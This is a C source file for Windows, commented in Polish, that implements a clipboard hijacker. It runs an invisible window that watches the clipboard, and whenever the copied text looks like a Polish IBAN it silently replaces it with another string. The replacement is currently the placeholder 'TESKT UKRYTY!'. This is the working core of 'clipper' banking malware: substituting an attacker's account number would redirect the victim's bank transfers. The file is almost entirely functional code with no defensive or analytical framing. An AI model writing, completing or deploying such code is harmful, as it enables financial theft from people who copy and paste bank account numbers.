#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>

bool isIBAN(char* text) {
    bool result = true;
    char *country = "PL";

    if (strlen(text) == 28) {
        if(text[0] == 'P' && text[1] == 'L') {
			for (int i = 2; i < 28; i++) {
				if (text[i] < '0' || text[i] > '9') {
					result = false;
					break;
				}
			}
        }
        else {
            result = false;
        }
    }
	else {
		result = false;
	}
    return result;
}

void change_clipboard() {
    char new_text[] = "TESKT UKRYTY!";
    HGLOBAL hNewData = GlobalAlloc(GMEM_MOVEABLE, sizeof(new_text));
    if (hNewData == NULL)
    {
        printf("Failed to allocate memory for new clipboard data\n");
        CloseClipboard();
        return;
    }

    memcpy(GlobalLock(hNewData), new_text, sizeof(new_text));
    GlobalUnlock(hNewData);

    EmptyClipboard();
    SetClipboardData(CF_TEXT, hNewData);
}

void clipboard() {
    

    if(OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);

        if (hData != NULL) {
            char* value = GlobalLock(hData);
            if (value != NULL) {
                GlobalUnlock(hData);
                printf("Clipboard: %s\n", value);

                if (isIBAN(value))
                    change_clipboard();
            }
        }
        

        CloseClipboard();
	}
}


// Definicja funkcji obsługi okna
LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {

    static BOOL created = FALSE;

    switch (message)
    {
    case WM_CREATE:
        created = AddClipboardFormatListener(hwnd);
        if (created == TRUE)
            return 0;
        else
            return -1;
    case WM_DESTROY:
        if (created)
        {
            RemoveClipboardFormatListener(hwnd);
            created = FALSE;
        }
        return 0;
    case WM_CLIPBOARDUPDATE:
        clipboard();
        return 0;
    }

    return DefWindowProc(hwnd, message, wParam, lParam);
}

int main()
{

    // Rejestracja klasy okna
    WNDCLASS windowClass;
    ZeroMemory(&windowClass, sizeof(WNDCLASS));
    windowClass.lpfnWndProc = WindowProcedure;
    windowClass.hInstance = NULL;
    windowClass.lpszClassName = L"ClipClass";
    RegisterClass(&windowClass);

    // Tworzenie okna (choć będzie niewidoczne)
    HWND hwnd = CreateWindow(
        L"ClipClass",   // Nazwa klasy
        NULL,           // Tytuł okna
        0,              // Styl okna
        0, 0, 0, 0,     // Pozycja i rozmiar okna (niewidoczne)
        NULL,           // Uchwyt do rodzica
        NULL,           // Uchwyt do menu
        NULL,           // Uchwyt do instancji
        NULL            // Dodatkowe dane
    );

    // Pętla komunikatów okna
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}